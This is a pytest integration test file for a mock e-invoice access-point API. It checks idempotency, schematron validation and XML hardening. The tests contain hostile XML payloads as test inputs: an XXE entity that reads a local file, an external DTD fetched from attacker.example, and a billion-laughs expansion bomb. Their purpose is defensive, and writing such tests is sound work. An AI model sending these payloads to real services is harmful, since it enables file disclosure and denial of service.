"""Integration tests for the mock ASP FastAPI app (`apx.asp_mock.app`), driven in-process over
ASGI: a duplicate `POST /v1/documents` returns the same receipt, a different payload under the
same key is a 409, invalid XML is rejected with the schematron rule IDs, an XXE/DOCTYPE-bearing
payload is rejected outright with no file-content disclosure, and 20 concurrent duplicate sends
yield exactly one archive record. The cases
that validate real invoice content use the real PINT AE schematron validator and official pinned
sample invoices (marked `artifacts`) -- no mocking of the validation gate itself; the
request-shape cases (bad idempotency key, malformed/oversized/XXE payloads) reject before the
validator is ever built, so they need no pinned data and run in the default suite."""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator
from pathlib import Path

import httpx
import pytest
from lxml import etree

from apx.asp_mock.app import create_app
from apx.asp_mock.repository import InMemoryAspRepository
from tests.fixtures.pint_ae_data import PINT_AE_DATA_ROOT, require_pint_ae_data_root

_SAMPLE_DIR = PINT_AE_DATA_ROOT / "1.0.4" / "resources" / "trn-invoice" / "example"


def _mutated_invalid_xml(valid_xml: bytes) -> bytes:
    """The official sample with its mandatory Invoice number (BT-1, `cbc:ID`) deleted, which
    fails schematron rule `ibr-002` (same mutation as `test_einvoice_schematron.py`)."""
    tree = etree.fromstring(valid_xml)
    ns = {"cbc": "urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2"}
    (id_element,) = tree.findall("cbc:ID", ns)
    id_element.getparent().remove(id_element)
    result: bytes = etree.tostring(tree, xml_declaration=True, encoding="UTF-8")
    return result


@pytest.fixture(scope="module")
def valid_xml() -> bytes:
    require_pint_ae_data_root()
    return (_SAMPLE_DIR / "Standard tax invoice.xml").read_bytes()


@pytest.fixture(scope="module")
def other_valid_xml() -> bytes:
    require_pint_ae_data_root()
    return (_SAMPLE_DIR / "Standard invoice Mandatory fields.xml").read_bytes()


@pytest.fixture
async def client() -> AsyncIterator[httpx.AsyncClient]:
    app = create_app(repository=InMemoryAspRepository(), data_root=PINT_AE_DATA_ROOT)
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://asp-mock.test"
    ) as c:
        yield c


async def _post(client: httpx.AsyncClient, key: str, xml: bytes) -> httpx.Response:
    return await client.post(
        "/v1/documents",
        content=xml,
        headers={"Idempotency-Key": key, "Content-Type": "application/xml"},
    )


@pytest.mark.artifacts
async def test_valid_document_is_accepted_and_archived(
    client: httpx.AsyncClient, valid_xml: bytes
) -> None:
    key = "inv-app-1:asp_send"
    response = await _post(client, key, valid_xml)
    assert response.status_code == 201
    receipt = response.json()
    assert receipt["status"] == "accepted"
    assert receipt["idempotency_key"] == key

    receipt_get = await client.get(f"/v1/receipts/{key}")
    assert receipt_get.status_code == 200
    assert receipt_get.json() == receipt

    archive_get = await client.get(f"/v1/archive/{key}")
    assert archive_get.status_code == 200
    archive = archive_get.json()
    assert archive["idempotency_key"] == key
    assert archive["retain_until"][:4] == str(int(archive["archived_at"][:4]) + 5)


@pytest.mark.artifacts
async def test_duplicate_send_returns_the_same_receipt(
    client: httpx.AsyncClient, valid_xml: bytes
) -> None:
    key = "inv-app-2:asp_send"
    first = await _post(client, key, valid_xml)
    second = await _post(client, key, valid_xml)
    assert first.status_code == second.status_code == 201
    assert first.json() == second.json()


@pytest.mark.artifacts
async def test_same_key_different_payload_is_a_conflict(
    client: httpx.AsyncClient, valid_xml: bytes, other_valid_xml: bytes
) -> None:
    key = "inv-app-3:asp_send"
    first = await _post(client, key, valid_xml)
    assert first.status_code == 201
    second = await _post(client, key, other_valid_xml)
    assert second.status_code == 409
    assert second.json()["error"] == "idempotency_conflict"


@pytest.mark.artifacts
async def test_invalid_xml_is_rejected_with_schematron_rule_ids(
    client: httpx.AsyncClient, valid_xml: bytes
) -> None:
    key = "inv-app-4:asp_send"
    response = await _post(client, key, _mutated_invalid_xml(valid_xml))
    assert response.status_code == 422
    body = response.json()
    assert body["error"] == "schematron_rejected"
    rule_ids = {f["rule_id"] for f in body["failures"]}
    assert "ibr-002" in rule_ids
    assert (await client.get(f"/v1/receipts/{key}")).status_code == 404
    assert (await client.get(f"/v1/archive/{key}")).status_code == 404


async def test_missing_idempotency_key_is_a_bad_request(client: httpx.AsyncClient) -> None:
    """The Idempotency-Key header is validated before the body is even read, so this needs no
    real invoice content -- any bytes prove the point without depending on pinned PINT AE data."""
    response = await client.post(
        "/v1/documents", content=b"<Invoice/>", headers={"Content-Type": "application/xml"}
    )
    assert response.status_code == 400
    assert response.json()["error"] == "bad_idempotency_key"


async def test_malformed_xml_is_a_bad_request(client: httpx.AsyncClient) -> None:
    response = await _post(client, "inv-app-5:asp_send", b"not xml at all")
    assert response.status_code == 400
    assert response.json()["error"] == "asp_error"


async def test_unknown_receipt_and_archive_are_404(client: httpx.AsyncClient) -> None:
    assert (await client.get("/v1/receipts/nope:asp_send")).status_code == 404
    assert (await client.get("/v1/archive/nope:asp_send")).status_code == 404


@pytest.mark.artifacts
async def test_concurrent_duplicate_sends_yield_one_archive_record(
    client: httpx.AsyncClient, valid_xml: bytes
) -> None:
    key = "inv-app-6:asp_send"
    responses = await asyncio.gather(*(_post(client, key, valid_xml) for _ in range(20)))
    assert all(r.status_code == 201 for r in responses)
    receipt_ids = {r.json()["receipt_id"] for r in responses}
    assert len(receipt_ids) == 1, "20 concurrent duplicate sends must yield one receipt"

    archive = await client.get(f"/v1/archive/{key}")
    assert archive.status_code == 200


async def test_xxe_local_file_disclosure_payload_is_rejected_without_leaking_file(
    client: httpx.AsyncClient, tmp_path: Path
) -> None:
    secret_path = tmp_path / "secret.txt"
    secret_marker = "TOP-SECRET-4f3c9b8a"
    secret_path.write_text(secret_marker, encoding="utf-8")
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE Invoice [ <!ENTITY xxe SYSTEM "'
        + secret_path.as_uri().encode("ascii")
        + b'"> ]>\n<Invoice>&xxe;</Invoice>'
    )

    response = await _post(client, "inv-app-xxe:asp_send", payload)

    assert response.status_code == 400
    assert response.json()["error"] == "asp_error"
    assert secret_marker not in response.text
    assert (await client.get("/v1/receipts/inv-app-xxe:asp_send")).status_code == 404


async def test_external_dtd_reference_is_rejected(client: httpx.AsyncClient) -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE Invoice SYSTEM "http://attacker.example/evil.dtd">\n<Invoice/>'
    )
    response = await _post(client, "inv-app-dtd:asp_send", payload)
    assert response.status_code == 400
    assert response.json()["error"] == "asp_error"


async def test_billion_laughs_payload_is_rejected(client: httpx.AsyncClient) -> None:
    """Typed 400 at the HTTP edge. The pre-parse guarantee is proven deterministically in
    test_common_xml (lxml never runs); the wall-clock bound lives behind the `perf` marker."""
    entities = ['<!ENTITY lol "lol">']
    for i in range(1, 10):
        expansion = f"&lol{i - 1};" if i > 1 else "&lol;"
        entities.append(f'<!ENTITY lol{i} "{expansion * 10}">')
    payload = (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE lolz [\n" + "\n".join(entities) + "\n]>\n<lolz>&lol9;</lolz>"
    ).encode("ascii")

    response = await _post(client, "inv-app-lolz:asp_send", payload)

    assert response.status_code == 400
    assert response.json()["error"] == "asp_error"


async def test_oversized_payload_is_rejected(client: httpx.AsyncClient) -> None:
    oversized = b"<root>" + b"a" * (5 * 1024 * 1024 + 1) + b"</root>"
    response = await _post(client, "inv-app-huge:asp_send", oversized)
    assert response.status_code == 400
    assert response.json()["error"] == "asp_error"
